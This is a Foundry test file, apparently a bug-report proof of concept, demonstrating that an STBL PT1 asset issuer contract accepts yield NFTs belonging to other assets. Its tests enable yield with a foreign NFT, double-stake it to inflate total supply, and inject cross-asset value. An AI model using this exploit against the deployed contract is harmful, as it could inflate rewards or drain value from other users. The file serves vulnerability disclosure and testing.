// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "forge-std/StdStorage.sol";

import "../src/STBL_Structs.sol";
import "../src/ISTBL_PT1_AssetIssuer.sol";
import "../src/ISTBL_Register.sol";
import "../src/ISTBL_PT1_AssetYieldDistributor.sol";
import "../src/ISTBL_YLD.sol";

contract MissingAssetIDValidation is Test {
    using stdStorage for StdStorage;

    address constant ISSUER_PT1_PROXY = 0xf8acF255854c8d36010C849f1702Eb350c8C4087;

    iSTBL_PT1_AssetIssuer issuer;
    iSTBL_Register registry;
    iSTBL_YLD yldToken;
    iSTBL_PT1_AssetYieldDistributor distributor;

    AssetDefinition pt1Asset;

    bytes32 constant SPLITTER_ROLE = keccak256("SPLITTER_ROLE");

    address splitter;

    uint256 constant FOREIGN_TOKEN_ID = 1;
    uint256 constant FOREIGN_ASSET_ID = 1;
    uint256 constant PT1_ASSET_ID     = 3;

    function setUp() public {
        issuer      = iSTBL_PT1_AssetIssuer(ISSUER_PT1_PROXY);
        registry    = iSTBL_Register(issuer.fetchRegistry());
        pt1Asset    = registry.fetchAssetData(PT1_ASSET_ID);
        yldToken    = iSTBL_YLD(registry.fetchYLDToken());
        distributor = iSTBL_PT1_AssetYieldDistributor(pt1Asset.rewardDistributor);

        splitter = makeAddr("splitter");

        stdstore
            .target(address(registry))
            .sig("hasRole(bytes32,address)")
            .with_key(SPLITTER_ROLE)
            .with_key(splitter)
            .checked_write(true);

        require(registry.hasRole(SPLITTER_ROLE, splitter), "role fail");

        YLD_Metadata memory meta = yldToken.getNFTData(FOREIGN_TOKEN_ID);
        assertEq(meta.assetID, FOREIGN_ASSET_ID);
        assertTrue(meta.assetID != PT1_ASSET_ID);
    }

    function getTotalSupply() internal view returns (uint256 supply) {
        (bool success, bytes memory data) =
            address(distributor).staticcall(
                abi.encodeWithSignature("totalSupply()")
            );

        require(success, "totalSupply() failed");
        supply = abi.decode(data, (uint256));
    }

    function getStakingData(uint256 tokenId)
        internal
        view
        returns (uint256 balance, uint256 rewardIndex, uint256 earned)
    {
        (bool success, bytes memory data) =
            address(distributor).staticcall(
                abi.encodeWithSignature("stakingData(uint256)", tokenId)
            );

        require(success, "stakingData() failed");

        (balance, rewardIndex, earned) =
            abi.decode(data, (uint256, uint256, uint256));
    }

    function test_enableYield_acceptsForeignNFT() public {
        vm.prank(splitter);
        issuer.enableYield(FOREIGN_TOKEN_ID);

        emit log("Foreign NFT accepted (BUG)");
    }

    function test_disableYield_acceptsForeignNFT() public {
        vm.startPrank(splitter);
        issuer.enableYield(FOREIGN_TOKEN_ID);
        issuer.disableYield(FOREIGN_TOKEN_ID);
        vm.stopPrank();

        emit log("Disable accepts foreign NFT (BUG)");
    }

    function test_TotalSupplyInflation_ByForeignNFT() public {
        uint256 tokenId = FOREIGN_TOKEN_ID;

        uint256 beforeSupply = getTotalSupply();

        vm.startPrank(splitter);
        issuer.enableYield(tokenId);
        issuer.enableYield(tokenId);
        vm.stopPrank();

        uint256 afterSupply = getTotalSupply();

        emit log_named_uint("Before totalSupply", beforeSupply);
        emit log_named_uint("After totalSupply", afterSupply);

        assertGt(afterSupply, beforeSupply);
    }

    function test_DoubleStaking_IncreasesBalance() public {
        uint256 tokenId = FOREIGN_TOKEN_ID;

        vm.startPrank(splitter);
        issuer.enableYield(tokenId);
        issuer.enableYield(tokenId);
        vm.stopPrank();

        (uint256 balance,,) = getStakingData(tokenId);

        emit log_named_uint("Recorded staking balance", balance);

        assertGt(balance, 0);
    }

    function test_CrossAssetValueInjection() public {
        uint256 tokenId = FOREIGN_TOKEN_ID;

        YLD_Metadata memory meta = yldToken.getNFTData(tokenId);

        vm.prank(splitter);
        issuer.enableYield(tokenId);

        (uint256 balance,,) = getStakingData(tokenId);

        emit log_named_uint("Foreign assetID", meta.assetID);
        emit log_named_uint("Injected value", meta.stableValueNet);
        emit log_named_uint("Recorded balance", balance);

        assertGt(balance, 0);
    }
}